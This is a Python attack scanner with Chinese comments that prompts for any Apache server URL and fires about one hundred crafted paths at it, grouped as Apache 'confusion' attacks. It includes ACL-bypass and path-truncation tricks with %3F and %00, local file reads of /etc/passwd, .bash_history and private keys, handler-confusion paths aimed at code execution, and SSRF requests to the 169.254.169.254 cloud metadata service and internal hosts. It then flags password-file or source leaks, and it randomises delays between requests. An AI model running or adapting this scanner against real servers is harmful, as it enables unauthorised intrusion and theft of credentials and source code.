import requests
import urllib.parse
import random
import time

# 使用者輸入目標 Apache 伺服器
TARGET = input("請輸入 Apache 伺服器的 URL (如 http://your-apache-server.com): ").strip()

# 測試 Payloads 分類，每類 20 組
PAYLOADS = {
    "Filename Confusion (ACL Bypass, Path Truncation)": [
        "/user/admin%2Fsecret.yml%3F",
        "/admin.php%3Fooo.php",
        "/config/config.yml%00",
        "/private/data.txt%3F",
        "/files/download.log%3F",
        "/secure/secret.env%3F",
        "/logs/error.log%00",
        "/internal/.htpasswd%3F",
        "/users/profile.json%00",
        "/api/token.txt%3F",
        "/data/system.log%00",
        "/public/uploads/.env%3F",
        "/home/db_backup.sql%3F",
        "/var/log/messages%3F",
        "/config/db.php%3F",
        "/apache.conf%00",
        "/config/settings.yaml%3F",
        "/server/config.ini%3F",
        "/backup.tar.gz%3F",
        "/config.xml%3F",
    ],

    "DocumentRoot Confusion (LFI, Source Code Disclosure)": [
        "/html/etc/passwd%3F",
        "/html/var/log/apache2/access.log%3F",
        "/config/main.php%00",
        "/web/cgi-bin/test.cgi%3F",
        "/var/www/html/index.php%00",
        "/srv/http/config.xml%3F",
        "/private/debug.txt%3F",
        "/logs/error.log%00",
        "/public/config.json%3F",
        "/api/v1/token.php%3F",
        "/root/.bash_history%3F",
        "/var/log/secure%3F",
        "/home/private_key.pem%3F",
        "/server-status%3F",
        "/private/auth.key%3F",
        "/internal/secret.php%00",
        "/.git/config%3F",
        "/backup/db_dump.sql%3F",
        "/var/cache/apache2/mod_cache_disk/metadata%3F",
        "/debug/error.log%3F",
    ],

    "Handler Confusion (MIME Trick, RCE)": [
        "/upload/1.gif%3fooo.php",
        "/uploads/test.jpg%3Ftest.php",
        "/api/v1/test%3F.json",
        "/logs/error.log%3F.php",
        "/scripts/logs.php%00",
        "/files/image.jpg%3Fcmd.php",
        "/cgi-bin/test.cgi%00",
        "/user/avatar.png%3Ftest.php",
        "/server/status%00",
        "/data/test.xml%3F.php",
        "/config/database.yml%3F",
        "/config/system.yaml%3F",
        "/backup.tar.gz%3F.php",
        "/internal/logs.txt%3F",
        "/error/debug.log%3F",
        "/debug/report.json%3F.php",
        "/server/debug.xml%3F",
        "/admin/config.xml%3F",
        "/data/users.csv%3F.php",
        "/private/api.log%3F",
    ],

    "SSRF (RewriteRule, TypeMap Exploits)": [
        "/proxy.php?url=http://169.254.169.254/latest/meta-data/",
        "/proxy.php?url=http://127.0.0.1/admin",
        "/api/fetch?url=http://192.168.1.1/",
        "/test?redirect=http://localhost/",
        "/check?link=http://10.0.0.1/",
        "/internal/proxy?target=http://internal.com/",
        "/service/ping?host=http://169.254.169.254/",
        "/backend/call?address=http://127.0.0.1/",
        "/fetch/data?site=http://10.10.10.10/",
        "/admin/test?url=http://internal.company.com/",
        "/admin/?redirect=http://localhost/",
        "/auth/login?service=http://10.0.0.1/",
        "/validate.php?input=http://127.0.0.1/",
        "/lookup?domain=http://internal-network/",
        "/api/resolve?host=http://localhost/",
        "/server/status?url=http://169.254.169.254/",
        "/ping?host=http://internal.gateway/",
        "/scan?target=http://127.0.0.1/",
        "/metadata?resource=http://10.10.10.10/",
        "/debug/logs?file=http://localhost/",
    ],

    "ProxyPass Attack (Apache Rewrite Exploits)": [
        "/.git/config",
        "/server-status",
        "/admin/config.php",
        "/backup/database.sql",
        "/internal/admin",
        "/configs/settings.ini",
        "/secrets/.env",
        "/logs/app.log",
        "/config/database.yml",
        "/debug/error.log",
        "/var/cache/apache2/proxy_cache",
        "/server/proxy-log.txt",
        "/tmp/apache-proxy.log",
        "/error/proxy-failed.log",
        "/.svn/entries",
        "/internal/admin-console",
        "/webdav/config.xml",
        "/debug/http-proxy.log",
        "/cache/proxy-metadata",
        "/backup/proxy-access.log",
    ],
}

# 結果存儲
results = {}

def test_vuln(category, payload_name, endpoint):
    url = urllib.parse.urljoin(TARGET, endpoint)
    print(f"[*] 測試 {category} - {payload_name}: {url}")
    
    try:
        response = requests.get(url, timeout=5)
        content = response.text.lower()
        
        if response.status_code == 200 and ("root:x" in content or "shadow:" in content):
            results[payload_name] = "[!!!] 高風險 - /etc/passwd 洩露!"
        elif response.status_code == 200 and ("<?php" in content or "<script>" in content):
            results[payload_name] = "[!!!] 高風險 - 原始碼洩露!"
        elif response.status_code == 200 and ("uid=" in content and "gid=" in content):
            results[payload_name] = "[!!!] 高風險 - 可能執行命令!"
        elif response.status_code == 200 and ("apache server status" in content or "server uptime" in content):
            results[payload_name] = "[!!!] 高風險 - 伺服器狀態外洩!"
        elif response.status_code in [200, 403] and "access denied" not in content:
            results[payload_name] = "[!] 可能存在漏洞 - 需人工檢查"
        else:
            results[payload_name] = "[OK] 未發現漏洞"
    except requests.RequestException:
        results[payload_name] = "[ERROR] 連線失敗"

# 執行測試
for category, payload_list in PAYLOADS.items():
    for i, payload in enumerate(payload_list):
        test_vuln(category, f"{category} {i+1}", payload)
        time.sleep(random.uniform(0.5, 1.5))

# 輸出結果
print("\n=== Apache Confusion Attack 測試報告 ===")
for test, result in results.items():
    print(f"{test}: {result}")
